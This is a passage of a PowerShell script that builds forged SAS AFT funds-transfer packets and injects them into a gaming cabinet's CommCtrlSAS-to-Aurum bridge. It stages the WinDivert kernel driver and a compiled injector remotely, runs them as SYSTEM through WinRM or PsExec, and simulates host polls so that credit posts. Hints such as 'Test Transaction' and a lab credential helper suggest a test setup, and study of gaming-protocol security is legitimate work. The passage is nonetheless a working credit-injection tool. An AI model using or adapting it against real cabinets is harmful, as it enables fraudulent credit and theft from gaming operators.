$wantAutoBridge = $AutoBridgePort -or ($BridgePort -le 0) -or ($resolvedProfile -eq 'Roulette' -and -not $PSBoundParameters.ContainsKey('BridgePort'))
if ($wantAutoBridge) {
    $pref = [System.Collections.Generic.List[int]]::new()
    if ($clientsSet.WakeUpPort -gt 0) { $pref.Add([int]$clientsSet.WakeUpPort) }
    if ($clientsSet.Port -gt 0 -and -not $pref.Contains([int]$clientsSet.Port)) { $pref.Add([int]$clientsSet.Port) }
    if ($resolvedProfile -eq 'Roulette') {
        foreach ($p in @(30550, 31150, 30500)) {
            if (-not $pref.Contains($p)) { $pref.Add($p) }
        }
    }
    else {
        foreach ($p in @(31150, 30550)) {
            if (-not $pref.Contains($p)) { $pref.Add($p) }
        }
    }
    Write-Host "[*] CabinetProfile=$resolvedProfile - probing live SAS bridge among $($pref -join ', ') ..." -ForegroundColor Cyan
    $bridgeProbe = Resolve-LiveSasBridgePort -Computer $ComputerName -PreferredPorts @($pref.ToArray()) -Credential $Credential
    if ($bridgeProbe.Port -gt 0) {
        $BridgePort = [int]$bridgeProbe.Port
        Write-Host "[+] Using BridgePort=$BridgePort ($($bridgeProbe.Detail))" -ForegroundColor Green
        if ($clientsSet.WakeUpPort -gt 0 -and $BridgePort -ne $clientsSet.WakeUpPort -and $BridgePort -ne $clientsSet.Port) {
            Write-Host "[!] BridgePort $BridgePort is not ClientsSet WakeUpPort=$($clientsSet.WakeUpPort)/Port=$($clientsSet.Port) - wrong channel risk." -ForegroundColor Yellow
        }
        if ($bridgeProbe.Detail -match 'LISTEN only') {
            Write-Host '    Warning: Aurum not ESTABLISHED yet - pollaft will wait for ephemeral client.' -ForegroundColor Yellow
        }
    }
    else {
        Write-Host "[!] SAS bridge not ready: $($bridgeProbe.Detail)" -ForegroundColor Red
        if ($bridgeProbe.Port40000Only) {
            Write-Host '    Roulette: Gateway SAS is on :40000 only. Restore COM5/MUX (cold boot), then retry.' -ForegroundColor Yellow
        }
        if ($Send) {
            throw "No live CommCtrlSAS<->Aurum bridge on $($pref -join '/'). $($bridgeProbe.Detail)"
        }
        $BridgePort = if ($clientsSet.WakeUpPort -gt 0) { [int]$clientsSet.WakeUpPort } `
            elseif ($resolvedProfile -eq 'Roulette') { 30550 } else { 31150 }
        Write-Host "[*] DryRun fallback BridgePort=$BridgePort (not verified live)" -ForegroundColor DarkGray
    }
}
elseif ($resolvedProfile -eq 'Roulette' -and $BridgePort -eq 31150) {
    Write-Host '[*] Roulette profile with BridgePort 31150 - if inject fails with NO_ESTABLISHED, retry with -AutoBridgePort (expects ClientsSet WakeUpPort, usually 30550).' -ForegroundColor Yellow
}

# ---- build the payload (after channel resolve so addr/port match ClientsSet) ----
$sasPacket = New-AftTransferPacket -Address $SasAddress -CashableAmount $cashableAmt -RestrictedAmount $restrictedAmt -NonRestrictedAmount $nonRestrictedAmt -Asset $AssetNumber -TxnNumber $TransactionNumber
$bridgePayload = New-Object byte[] ($sasPacket.Length + 1)
$bridgePayload[0] = 0x1B
[Array]::Copy($sasPacket, 0, $bridgePayload, 1, $sasPacket.Length)

$sasPacketHex = ConvertTo-Hex $sasPacket
$bridgePayloadHex = ConvertTo-Hex $bridgePayload
# Stable marker: active amount BCD + flags + asset LE (independent of txn id).
$activeAmountRange = switch ($TransferType) {
    'cashable'       { 6..10 }
    'restricted'     { 11..15 }
    default          { 16..20 }
}
$markerBytes = New-Object System.Collections.Generic.List[byte]
$markerBytes.AddRange([byte[]]($sasPacket[$activeAmountRange]))
$markerBytes.AddRange([byte[]]($sasPacket[21..25]))
$markerHex = ConvertTo-Hex ([byte[]]$markerBytes.ToArray())

Write-Host ''
Write-Host '=== WinDivert raw SAS AFT injection ===' -ForegroundColor White
Write-Host "Cabinet : $ComputerName  |  Profile: $resolvedProfile  |  Flow: CommCtrlSAS:$BridgePort -> Aurum:<ephemeral> (server->client)"
Write-Host "SAS addr: $SasAddress   |  Asset: $AssetNumber   |  Transfer type: $TransferType   |  Amount: $AmountCents (raw SAS units; = `$$([double]$AmountCents / 100.0) if 1 unit = 1 cent)  |  Txn: Test Transaction$TransactionNumber"
Write-Host ''
Write-Host "SAS packet     : $sasPacketHex"
Write-Host "Bridge payload : $bridgePayloadHex   (0x1B + SAS bytes; this is injected)"
Write-Host "Match marker   : $markerHex   ($TransferType amount $AmountCents + asset $AssetNumber)"
Write-Host ''
Write-Host '--- decode ---' -ForegroundColor DarkGray
Write-Host ("  addr={0:X2} cmd=72 len={1:X2} transferCode=00 idx=00 type=00 (active field: {2})" -f $sasPacket[0], $sasPacket[2], $TransferType)
Write-Host ("  cashable={0} restricted={1} nonRestricted={2} (active '{3}' carries raw {4}; = `$$([double]$AmountCents/100.0) if 1 unit = 1 cent)" -f (ConvertTo-Hex ($sasPacket[6..10])), (ConvertTo-Hex ($sasPacket[11..15])), (ConvertTo-Hex ($sasPacket[16..20])), $TransferType, $AmountCents)
Write-Host ("  assetLE={0} (={1}) registrationKey=20x00" -f (ConvertTo-Hex ($sasPacket[22..25])), $AssetNumber)
Write-Host ("  CRC16={0}" -f (ConvertTo-Hex ($sasPacket[($sasPacket.Length-2)..($sasPacket.Length-1)])))
Write-Host ''

$WinDivertDir = Resolve-WinDivertDir -Preferred $WinDivertDir
$dll = Join-Path $WinDivertDir 'WinDivert.dll'
$sys = Join-Path $WinDivertDir 'WinDivert64.sys'
$RepoRoot = Split-Path -Parent $PSScriptRoot
$csSrc = Join-Path $RepoRoot 'probes\WdInject.cs'
$pollCsSrc = Join-Path $RepoRoot 'probes\WdPollInject.cs'
foreach ($f in @($PsExecPath, $dll, $sys, $csSrc, $pollCsSrc)) {
    if (-not (Test-Path -LiteralPath $f)) { throw "Required file not found: $f" }
}

# Cache the compiled injector per WdInject.cs content hash. The cabinet keeps a stable
# bin-<hash> folder, so csc recompiles ONLY when the source actually changes; unchanged
# runs skip both staging and compilation (and dodge the WinDivert.dll copy-lock, since
# we never re-copy on a cache hit).
$srcHash = (Get-FileHash -LiteralPath $csSrc -Algorithm SHA256).Hash.Substring(0, 12).ToLowerInvariant()
$pollSrcHash = (Get-FileHash -LiteralPath $pollCsSrc -Algorithm SHA256).Hash.Substring(0, 12).ToLowerInvariant()
$remoteBaseDirUnc = "\\$ComputerName\c`$\Windows\Temp\aurumtap"
$remoteBinName = "bin-$srcHash"
$remotePollBinName = "pollinjectbin-$pollSrcHash"
$remoteDirUnc = Join-Path $remoteBaseDirUnc $remoteBinName
$remotePollDirUnc = Join-Path $remoteBaseDirUnc $remotePollBinName
$remoteRunPath = "C:\Windows\Temp\aurumtap\$remoteBinName"
$remotePollRunPath = "C:\Windows\Temp\aurumtap\$remotePollBinName"
$exeUnc = Join-Path $remoteDirUnc 'WdInject.exe'
$pollExeUnc = Join-Path $remotePollDirUnc 'WdPollInject.exe'
$wouldRun = "WinRM first (5985), PsExec (-s) fallback | EncodedCommand -> csc/WdInject.exe $bridgePayloadHex $BridgePort $ObserveMs $AckGraceMs"
$wouldRunPollAft = "WinRM/PsExec -> WdPollInject.exe pollaft (TCP 1B80/1B81 @${WinDivertPollIntervalMs}ms + AFT) ephem discovered live, ${WinDivertPollSeconds}s window"

if ($PSCmdlet.ParameterSetName -eq 'DryRun') {
    Write-Host '[dry-run] Nothing staged or injected.' -ForegroundColor Yellow
    Write-Host 'Remote command that WOULD run (as SYSTEM):' -ForegroundColor DarkGray
    $dryPollMode = if ($NoAutoSasPoll) { 'None' } else { $SasPollMode }
    if ($dryPollMode -ne 'None' -and -not (Test-CabinetSasPollsRecent -Computer $ComputerName -WithinSeconds 12)) {
        if ($dryPollMode -in @('Auto', 'WinDivert')) {
            Write-Host "  Poll path: $wouldRunPollAft" -ForegroundColor DarkGray
            Write-Host "  Cache dir: $remotePollDirUnc  (pollinjectbin-$pollSrcHash)" -ForegroundColor DarkGray
        }
        elseif ($dryPollMode -eq 'Com') {
            Write-Host "  Poll path: COM poll keeper on $SasComPort, then WdInject.exe" -ForegroundColor DarkGray
        }
    }
    else {
        Write-Host "  Poll path: external polls active (or -NoAutoSasPoll) -> WdInject.exe only" -ForegroundColor DarkGray
    }
    Write-Host "  Inject: $wouldRun" -ForegroundColor DarkGray
    Write-Host "  Cache dir: $remoteDirUnc  (bin-$srcHash; stages WinDivert.dll/.sys/.cs + compiles only on a cache miss)" -ForegroundColor DarkGray
    Write-Host ''
    Write-Host '***************************************************************' -ForegroundColor Yellow
    Write-Host '*  THIS WAS A DRY RUN -- NOTHING WAS INJECTED.                *' -ForegroundColor Yellow
    Write-Host '*  No credit was posted to the cabinet.                       *' -ForegroundColor Yellow
    Write-Host '*  To actually inject this AFT packet, re-run with -Send.       *' -ForegroundColor Yellow
    Write-Host '*                                                             *' -ForegroundColor Yellow
    Write-Host '*      .\Invoke-WinDivertAft.ps1 -Send                        *' -ForegroundColor Green
    Write-Host '*                                                             *' -ForegroundColor Yellow
    Write-Host '***************************************************************' -ForegroundColor Yellow
    exit 0
}

# ---- Send: stage + compile + inject + verify ----

$bootstrap = Initialize-CabinetInjectPrerequisites -Computer $ComputerName -Credential $Credential `
    -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs -NoAutoBootstrap:$NoAutoBootstrap
$script:PsExecAuthArgs = @($bootstrap.AuthArgs)
$script:InjectBootstrapReport = $bootstrap
if ($bootstrap.Attempted -and -not $bootstrap.SmbOk) {
    Write-Host '[!] Auto-bootstrap: SMB log access still unavailable; poll diagnosis may be limited.' -ForegroundColor Yellow
}

$pollKeeperProc = $null
$sasPollModeEffective = if ($NoAutoSasPoll) { 'None' } else { $SasPollMode }
if ((Test-CabinetPrefersMuxComPolls -Computer $ComputerName) -and ($sasPollModeEffective -eq 'Auto')) {
    # legacy hook - COM-first path disabled; WinDivert pollaft matches .90
}
$pollStrategy = Resolve-SasPollStrategy -Computer $ComputerName -Mode $sasPollModeEffective
Write-MuxComPollPrerequisites -Computer $ComputerName -Port $SasComPort
$usePollAft = $false
$pollCutoffUtc = if ($PollBaselineUtc) { $PollBaselineUtc } else { $null }
if ($pollCutoffUtc) {
    $latestPoll = Get-CabinetLatestPollLine -Computer $ComputerName
    if ($latestPoll) {
        Write-Host "[*] Poll baseline: last sasmsgr line = $latestPoll" -ForegroundColor DarkGray
    }
}

try {
$autoWakeEnabled = -not $NoAutoWake
$autoWakeDone = $false
$wakeSinceUtc = $null
$autoWakeDoneRef = [ref]$autoWakeDone
$wakeSinceUtcRef = [ref]$wakeSinceUtc

$autoWakeAction = {
    param($State)
    if ($State -and $State.LastLine) {
        Write-Host "    $($State.LastLine)" -ForegroundColor DarkGray
    }
    Invoke-SasBridgeAutoWake -Computer $ComputerName -Credential $Credential -ClearPendingAft -PsExecPath $PsExecPath | Out-Null
    $autoWakeDoneRef.Value = $true
    $wakeSinceUtcRef.Value = (Get-Date).ToUniversalTime()
}

$organicPolls = Test-CabinetSasPollsRecent -Computer $ComputerName -WithinSeconds 12
if ($organicPolls) {
    Write-Host '[*] Organic SAS polls active (IGT tester or host) - inject works with tester on or off; AutoWake suppressed unless hard pending AFT.' -ForegroundColor Cyan
}

$aurumState = Get-AurumAftFsmState -Computer $ComputerName
if ($aurumState.SoftOnly) {
    Write-Host "[*] $($aurumState.Reason)" -ForegroundColor DarkGray
    if ($aurumState.LastLine) {
        Write-Host "    $($aurumState.LastLine)" -ForegroundColor DarkGray
    }
}

# Do not recycle the bridge for soft/cashout noise, and never AutoWake while a live
# tester is polling unless the hard pending-AFT blockers need a clear.
$allowAutoWakeNow = $autoWakeEnabled -and -not $autoWakeDone -and -not $aurumState.SoftOnly `
    -and (-not $organicPolls -or (Test-AurumWakeableBlocker -State $aurumState))

if (-not $SkipAurumReadyWait -and -not $aurumState.Ready -and $allowAutoWakeNow) {
    Write-Host "[*] Aurum not ready: $($aurumState.Reason)" -ForegroundColor Yellow
    if (Test-AurumWakeableBlocker -State $aurumState) {
        Write-Host '[*] AutoWake: restart bridge + clear stale pending AFT (exception 69)...' -ForegroundColor Cyan
    }
    else {
        Write-Host '[*] AutoWake: restart bridge services...' -ForegroundColor Cyan
    }
    & $autoWakeAction $aurumState
    $autoWakeDone = $autoWakeDoneRef.Value
    $wakeSinceUtc = $wakeSinceUtcRef.Value
    $aurumState = @{ Ready = $false; Reason = 'Post-wake'; LastLine = $null; SoftOnly = $false }
}

if (-not $SkipAurumReadyWait -and -not $aurumState.Ready) {
    $waitSec = if ($autoWakeDone) { [math]::Min($AurumReadyWaitSec, 60) } else { $AurumReadyWaitSec }
    # With organic tester polls, keep the wait short — usually idle already.
    if ($organicPolls -and -not $autoWakeDone) {
        $waitSec = [math]::Min($waitSec, 30)
    }
    Write-Host "[*] Waiting up to ${waitSec}s for Aurum WAT idle..." -ForegroundColor Cyan
    $wakeOnBlocker = $allowAutoWakeNow -or ($autoWakeEnabled -and -not $organicPolls)
    $aurumState = Wait-AurumAftReady -Computer $ComputerName -TimeoutSec $waitSec -SinceUtc $wakeSinceUtc `
        -AutoWakeOnBlocker:$wakeOnBlocker -AutoWakeDoneRef $autoWakeDoneRef -WakeSinceUtcRef $wakeSinceUtcRef `
        -AutoWakeAction $autoWakeAction
    $autoWakeDone = $autoWakeDoneRef.Value
    $wakeSinceUtc = $wakeSinceUtcRef.Value
}
elseif ($SkipAurumReadyWait) {
    $aurumState = Get-AurumAftFsmState -Computer $ComputerName -SinceUtc $wakeSinceUtc
}

if (-not $aurumState.Ready) {
    Write-Host ''
    Write-Host '[!] Aborting inject: Aurum AFT layer still busy.' -ForegroundColor Red
    Write-Host "    $($aurumState.Reason)" -ForegroundColor Yellow
    if ($aurumState.LastLine) {
        Write-Host "    $($aurumState.LastLine)" -ForegroundColor DarkGray
    }
    Write-Host '    Wait for transfer finish / clear exception 69 (cashout exception 66 is ignored). Use -SkipAurumReadyWait to override.' -ForegroundColor Yellow
    exit 5
}
Write-Host "[+] Aurum AFT ready: $($aurumState.Reason)" -ForegroundColor Green
if ($aurumState.LastLine) {
    Write-Host "    $($aurumState.LastLine)" -ForegroundColor DarkGray
}

$preflightBridge = Get-Wat2AftWarmupFailureDetail -Computer $ComputerName -TailLines 120
$bridgeNeedsRecycle = ($preflightBridge.Category -in @('mapping_false', 'wat2aft_stale', 'egm_connect_retry', 'no_owned_device')) `
    -or (-not (Test-AurumWat2AftRecent -Computer $ComputerName -WithinSeconds 300))
if ($bridgeNeedsRecycle -and $autoWakeEnabled -and -not $autoWakeDone -and -not $SkipAurumReadyWait) {
    if ($organicPolls) {
        Write-Host ("[*] Bridge recycle hinted ({0}) but organic/tester polls are live - skipping AutoWake to keep the SAS channel up." -f $preflightBridge.Category) -ForegroundColor Yellow
    }
    else {
        Write-Host ("[*] Bridge recycle needed ({0}) - AutoWake (proven wake-before-inject path)..." -f $preflightBridge.Category) -ForegroundColor Cyan
        if ($preflightBridge.Evidence.Count -gt 0) {
            Write-Host "    $($preflightBridge.Evidence[0])" -ForegroundColor DarkGray
        }
        & $autoWakeAction $null
        $autoWakeDone = $autoWakeDoneRef.Value
        $wakeSinceUtc = $wakeSinceUtcRef.Value
    }
}

$deferWat2AftForPollSim = -not $pollStrategy.PollsActive -and ($pollStrategy.UsePollAft -or $pollStrategy.UseComKeeper)

if ($autoWakeDone -and $deferWat2AftForPollSim) {
    Write-Host '[*] Post-wake: skipping WAT2AFT wait  -  no 80/81 yet; pollaft/COM keeper will bring polls then AFT in one session.' -ForegroundColor Cyan
    if ($pollStrategy.UsePollAft) {
        Write-Host ("    WinDivert pollaft will simulate 1B80/1B81 on loopback {0} first." -f $BridgePort) -ForegroundColor DarkGray
    }
    if ($pollStrategy.UseComKeeper) {
        Write-Host "[*] Built-in COM poll keeper will drive 80/81 on $SasComPort first." -ForegroundColor DarkGray
    }
}
elseif ($autoWakeDone) {
    Write-Host '[*] Post-wake: confirming WAT2AFT UP + Aurum mapping before inject...' -ForegroundColor Cyan
    Confirm-AurumInjectReady -Computer $ComputerName -WatTimeoutSec 90 -MappingTimeoutSec 45 `
        -SettleSec $AurumPostWakeSettleSec -SinceUtc $wakeSinceUtc -Context 'post-AutoWake' `
        -AllowAutoWakeRetry:$false -AutoWakeAction $autoWakeAction `
        -AutoWakeDoneRef $autoWakeDoneRef -WakeSinceUtcRef $wakeSinceUtcRef
}
elseif ((Test-AurumWat2AftRecent -Computer $ComputerName -WithinSeconds 120)) {
    Write-Host '[*] Recent WAT2AFT recycle detected  -  waiting for mapping before inject...' -ForegroundColor Cyan
    Confirm-AurumInjectReady -Computer $ComputerName -WatTimeoutSec $AurumWarmupSec -MappingTimeoutSec 45 `
        -SettleSec $AurumPostWakeSettleSec -Context 'recent WAT2AFT' `
        -AllowAutoWakeRetry:$autoWakeEnabled -AutoWakeAction $autoWakeAction `
        -AutoWakeDoneRef $autoWakeDoneRef -WakeSinceUtcRef $wakeSinceUtcRef
    $autoWakeDone = $autoWakeDoneRef.Value
    $wakeSinceUtc = $wakeSinceUtcRef.Value
}
elseif ($AurumWarmupSec -gt 0) {
    if ($deferWat2AftForPollSim) {
        if ($pollStrategy.UsePollAft) {
            Write-Host ("[*] Skipping pre-inject WAT2AFT warmup  -  WinDivert pollaft will simulate 1B80/1B81 on loopback {0} first." -f $BridgePort) -ForegroundColor Cyan
            Write-Host '    Polls must appear in sasmsgr before WAT2AFT can own the device; pollaft runs general polls then AFT in one session.' -ForegroundColor DarkGray
            Write-Host '    Works with IGT tester on (organic polls) or off (pollaft supplies 80/81).' -ForegroundColor DarkGray
        }
        if ($pollStrategy.UseComKeeper) {
            Write-Host '[*] Skipping pre-inject WAT2AFT warmup  -  built-in COM poll keeper will drive 80/81 on the MUX cable first.' -ForegroundColor Cyan
            Write-Host "    Host polls on $SasComPort should surface as qGMID1:80/81 in cabinet sasmsgr (COM11/MUX serial path)." -ForegroundColor DarkGray
        }
        if ($ComputerName -eq '10.0.0.171') {
            Write-Host '    Note: .171 may also need COM11/MUX serial-side polls for full EGM online (see aft/investigations/171-landing-plan.md).' -ForegroundColor DarkGray
        }
    }
    else {
        Write-Host "[*] Waiting up to 90s for WAT2AFT UP + mapping..." -ForegroundColor Cyan
        Confirm-AurumInjectReady -Computer $ComputerName -WatTimeoutSec 90 -MappingTimeoutSec 45 `
            -SettleSec $AurumPostWakeSettleSec -SinceUtc $wakeSinceUtc -Context 'warmup' -AllowAutoWakeRetry:$autoWakeEnabled -AutoWakeAction $autoWakeAction `
            -AutoWakeDoneRef $autoWakeDoneRef -WakeSinceUtcRef $wakeSinceUtcRef
        $autoWakeDone = $autoWakeDoneRef.Value
        $wakeSinceUtc = $wakeSinceUtcRef.Value
    }
}

$pollWaitSecEffective = if ($RemediationPollWaitSec -gt 0) {
    $RemediationPollWaitSec
}
elseif ($ComputerName -eq '10.0.0.171') {
    45
}
else {
    30
}

$remediation = Invoke-CabinetInjectRemediationLoop -Computer $ComputerName -Credential $Credential `
    -MaxCycles $MaxRemediationCycles -PollWaitSec $pollWaitSecEffective -StaleWakeMin $StaleWakeMin `
    -SasComPort $SasComPort -SasPollWarmupSec $SasPollWarmupSec -SasPollModeEffective $sasPollModeEffective `
    -PollStrategy $pollStrategy -NoAutoWake:$NoAutoWake -NoAutoBootstrap:$NoAutoBootstrap `
    -PsExecPath $PsExecPath -PollCutoffUtc $pollCutoffUtc

$pollKeeperProc = $remediation.PollKeeperProc
if ($remediation.UsePollAft) {
    $usePollAft = $true
    Write-Host ("[*] WinDivert poll sim: 1B80/1B81 injected into CommCtrlSAS:{0} -> Aurum TCP (no physical COM host)." -f $BridgePort) -ForegroundColor Cyan
    Write-Host ("    Waiting up to {0}s for Aurum TCP client on {1}, then poll cadence {2}ms, AFT @ {3}ms, window {4}s" -f $WinDivertEphemWaitSec, $BridgePort, $WinDivertPollIntervalMs, $WinDivertPollInjectDelayMs, $WinDivertPollSeconds) -ForegroundColor DarkGray
}
elseif ($remediation.PollsReady) {
    Write-Host '[+] Live 80/81 polls visible in cabinet sasmsgr  -  safe to inject.' -ForegroundColor Green
}
else {
    Write-CabinetRemediationAbort -CycleLog $remediation.CycleLog -MaxCycles $MaxRemediationCycles `
        -Computer $ComputerName -LastDiagnosis $remediation.LastDiagnosis
    exit 4
}

if ($autoTransactionStatePath) {
    Write-Host "[*] Auto transaction number: Test Transaction$TransactionNumber (next for ${ComputerName}: $autoTransactionNext)" -ForegroundColor DarkGray
}

$swStage = [System.Diagnostics.Stopwatch]::StartNew()
$cacheHit = Test-Path -LiteralPath $exeUnc
$pollCacheHit = Test-Path -LiteralPath $pollExeUnc
if ($usePollAft) {
    if ($pollCacheHit) {
        Write-Host "[*] Reusing cached WdPollInject.exe on cabinet ($remotePollBinName); skipping stage + compile." -ForegroundColor Cyan
    }
    else {
        New-Item -ItemType Directory -Force -Path $remotePollDirUnc | Out-Null
        Copy-Item -LiteralPath $dll -Destination $remotePollDirUnc -Force
        Copy-Item -LiteralPath $sys -Destination $remotePollDirUnc -Force
        Copy-Item -LiteralPath $pollCsSrc -Destination $remotePollDirUnc -Force
        Write-Host "[*] Cache miss ($remotePollBinName): staged WinDivert + WdPollInject.cs for TCP poll sim." -ForegroundColor Cyan
    }
}
if (-not $usePollAft) {
    if ($cacheHit) {
        Write-Host "[*] Reusing cached WdInject.exe on cabinet (bin-$srcHash); skipping stage + compile." -ForegroundColor Cyan
    }
    else {
        New-Item -ItemType Directory -Force -Path $remoteDirUnc | Out-Null
        Copy-Item -LiteralPath $dll -Destination $remoteDirUnc -Force
        Copy-Item -LiteralPath $sys -Destination $remoteDirUnc -Force
        Copy-Item -LiteralPath $csSrc -Destination $remoteDirUnc -Force
        Write-Host "[*] Cache miss (bin-$srcHash): staged WinDivert.dll, WinDivert64.sys, WdInject.cs to $remoteDirUnc (compiles WdInject.exe once)." -ForegroundColor Cyan
    }
}
$swStage.Stop()
$stageElapsed = $swStage.Elapsed

$outUnc = if ($usePollAft) { Join-Path $remotePollDirUnc 'pollaft_out.txt' } else { Join-Path $remoteDirUnc 'inject_out.txt' }

# Remote script compiles ONLY when WdInject.exe is absent (cache miss); otherwise it
# runs the cached exe directly. Any change to WdInject.cs changes $srcHash -> new
# bin-<hash> folder -> a one-time recompile, so the cache can never go stale.
$remoteTemplate = @'
$ErrorActionPreference = "Stop"
$wd  = "__REMOTE_WD__"
$csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
$exe = "$wd\WdInject.exe"
$out = "$wd\inject_out.txt"
Remove-Item $out -Force -ErrorAction SilentlyContinue
try {
    if (-not (Test-Path $exe)) {
        & $csc /nologo /platform:x64 /optimize+ /out:"$exe" "$wd\WdInject.cs" 2>&1 | Out-File -FilePath $out -Encoding utf8 -Append
    }
    if (-not (Test-Path $exe)) {
        "COMPILE_FAILED" | Out-File -FilePath $out -Encoding utf8 -Append
    } else {
        $svcConfig = (& sc.exe qc WinDivert 2>&1 | Out-String)
        if ($svcConfig -match 'START_TYPE\s+:\s+4\s+DISABLED') {
            "PRE_OPEN_WARN: WinDivert service is disabled before open; not repairing/deleting per-run. Trying WinDivertOpen." | Out-File -FilePath $out -Encoding utf8 -Append
            $svcConfig | Out-File -FilePath $out -Encoding utf8 -Append
        }
        elseif ($svcConfig -match 'marked for deletion|1072') {
            "PRE_OPEN_WARN: WinDivert service reports marked for deletion before open. Trying WinDivertOpen; actual open result decides." | Out-File -FilePath $out -Encoding utf8 -Append
            $svcConfig | Out-File -FilePath $out -Encoding utf8 -Append
        }
        $prevEap = $ErrorActionPreference
        $ErrorActionPreference = "Continue"
        try {
            & "$exe" __PAYLOAD__ __PORT__ __OBSERVE__ __ACKGRACE__ 2>&1 | Out-File -FilePath $out -Encoding utf8 -Append
            "EXITCODE=$LASTEXITCODE" | Out-File -FilePath $out -Encoding utf8 -Append
        }
        finally {
            $ErrorActionPreference = $prevEap
        }
    }
}
catch {
    "REMOTE_EXCEPTION: $_" | Out-File -FilePath $out -Encoding utf8 -Append
}
finally {
    # Do NOT sc-stop / sc-delete WinDivert here. WinDivert installs the kernel-driver
    # service on open and unloads it when the last handle closes (WdInject.exe closes
    # on every exit path, including Ctrl-C/ProcessExit). Deleting a service whose driver
    # is still referenced is exactly what produces STOP_PENDING + "marked for deletion"
    # (Windows cannot force-unload a referenced kernel driver). We leave the service
    # registered as demand-start: idle when unused, instantly reusable next run, and a
    # crashed/orphaned run leaves a REUSABLE driver instead of a wedged one. Use
    # Invoke-WinDivertAft.ps1 -RemoveDriver for an explicit, safe teardown.
}
'@
$remoteScript = $remoteTemplate.Replace('__PAYLOAD__', $bridgePayloadHex).Replace('__PORT__', [string]$BridgePort).Replace('__OBSERVE__', [string]$ObserveMs).Replace('__ACKGRACE__', [string]$AckGraceMs).Replace('__REMOTE_WD__', $remoteRunPath)
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($remoteScript))

$pollAftScript = New-WinDivertPollAftRemoteScript -RemoteRunPath $remotePollRunPath -BridgePayloadHex $bridgePayloadHex `
    -BridgePort $BridgePort -RunSeconds $WinDivertPollSeconds -IntervalMs $WinDivertPollIntervalMs `
    -DrainSec $WinDivertPollDrainSec -InjectDelayMs $WinDivertPollInjectDelayMs -EphemWaitSec $WinDivertEphemWaitSec
$encPollAft = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pollAftScript))

# ---- transport selection (WinRM preferred / PsExec fallback) ----
$transportStatePath = Join-Path (Split-Path $PSScriptRoot -Parent) '.aft-windivert-transport.json'

function Get-TransportState {
    param([string] $Path)
    $state = @{}
    if (Test-Path -LiteralPath $Path) {
        try {
            $json = Get-Content -LiteralPath $Path -Raw | ConvertFrom-Json
            foreach ($p in $json.PSObject.Properties) {
                $winrm = $false
                if ($p.Value -and $p.Value.PSObject.Properties['winrm']) { $winrm = [bool]$p.Value.winrm }
                $state[$p.Name] = @{ winrm = $winrm }
            }
        }
        catch {
            $state = @{}
        }
    }
    return $state
}

function Save-TransportState {
    param([hashtable] $State, [string] $Path)
    try {
        $obj = @{}
        foreach ($k in $State.Keys) {
            $obj[$k] = @{ winrm = [bool]$State[$k].winrm }
        }
        $obj | ConvertTo-Json | Set-Content -LiteralPath $Path -Encoding UTF8
    }
    catch {
        Write-Host "[!] Could not save transport state: $_" -ForegroundColor Yellow
    }
}

function Test-WdInjectOpenOk {
    param([string] $Output)
    return [bool]($Output -match '(?m)^OPEN ok\s*$')
}

function Get-WdInjectFatalDriverFailure {
    param([string] $Output)

    $openOk = Test-WdInjectOpenOk -Output $Output
    if ($Output -match 'WinDivertOpen FAILED GetLastError=1058') {
        return 'WinDivertOpen failed with Windows error 1058 (driver service disabled or cannot be started). Fix the WinDivert service state, then retry.'
    }

    # Pre-open service noise is only fatal if WinDivertOpen never succeeded. A stale
    # "marked for deletion" / STOP_PENDING line followed by OPEN ok means the driver
    # was usable for this run; let packet timeout/ingestion handling decide instead.
    if (-not $openOk -and $Output -match 'marked for deletion|STOP_PENDING') {
        return 'WinDivert driver service appears stuck before open (STOP_PENDING / marked for deletion) and WinDivertOpen did not succeed. Reboot the cabinet to clear the kernel driver service, then retry.'
    }

    return $null
}

# 4a. Load persisted state and resolve transport order (always probe WinRM first).
$transportState = Get-TransportState -Path $transportStatePath
$transportPlan = Get-LabRemoteTransportPlan -ComputerName $ComputerName -Credential $Credential `
    -CredentialFromLab:$script:CredentialFromLab
$scheduleWinRmEnable = $transportPlan.ScheduleWinRmEnable
$transportOrder = @($transportPlan.TransportOrder)

if ($transportPlan.WinRmPreferredThisRun) {
    if (-not $transportState.ContainsKey($ComputerName)) { $transportState[$ComputerName] = @{ winrm = $false } }
    if (-not $transportState[$ComputerName].winrm) {
        $transportState[$ComputerName].winrm = $true
        Save-TransportState -State $transportState -Path $transportStatePath
    }
}

$ingestLine = $null
$creditEvidence = @()
$attempt = 0
$lastInjectOut = ''
$injectElapsed = [TimeSpan]::Zero
$ingestElapsed = [TimeSpan]::Zero
$creditElapsed = [TimeSpan]::Zero
$fatalInjectFailure = $null

while ($attempt -lt $MaxRetries) {
    $attempt++
    $attemptPollAft = $usePollAft
    $attemptEnc = if ($attemptPollAft) { $encPollAft } else { $enc }
    $attemptOutUnc = if ($attemptPollAft) { Join-Path $remotePollDirUnc 'pollaft_out.txt' } else { Join-Path $remoteDirUnc 'inject_out.txt' }
    $injectLabel = if ($attemptPollAft) { 'WdPollInject.exe (pollaft)' } else { 'WdInject.exe' }

    Write-Host ''
    Write-Host "[*] Live injection attempt $attempt of $MaxRetries ($injectLabel)..." -ForegroundColor Cyan
    $sendStartUtc = (Get-Date).ToUniversalTime()
    Remove-Item -LiteralPath $attemptOutUnc -Force -ErrorAction SilentlyContinue

    if (-not $attemptPollAft -and -not (Test-Path -LiteralPath $exeUnc)) {
        if (-not (Test-Path -LiteralPath $remoteDirUnc)) {
            New-Item -ItemType Directory -Force -Path $remoteDirUnc | Out-Null
        }
        Copy-Item -LiteralPath $dll -Destination $remoteDirUnc -Force -ErrorAction SilentlyContinue
        Copy-Item -LiteralPath $sys -Destination $remoteDirUnc -Force -ErrorAction SilentlyContinue
        Copy-Item -LiteralPath $csSrc -Destination $remoteDirUnc -Force -ErrorAction SilentlyContinue
    }

    $usedTransport = $null
    $swInject = [System.Diagnostics.Stopwatch]::StartNew()
    $transportLog = Join-Path $env:TEMP ("wdinject_{0}_{1}.log" -f $ComputerName.Replace('.','_'), (Get-Date -Format 'yyyyMMddHHmmssfff'))
    $winRmTimeoutMs = if ($attemptPollAft) {
        ([Math]::Max($WinDivertEphemWaitSec + $WinDivertPollSeconds + $WinDivertPollDrainSec + 30, 120)) * 1000
    } else { $null }
    $psexecTimeoutSec = if ($attemptPollAft) {
        [Math]::Max($WinDivertEphemWaitSec + $WinDivertPollSeconds + $WinDivertPollDrainSec + 20, 90)
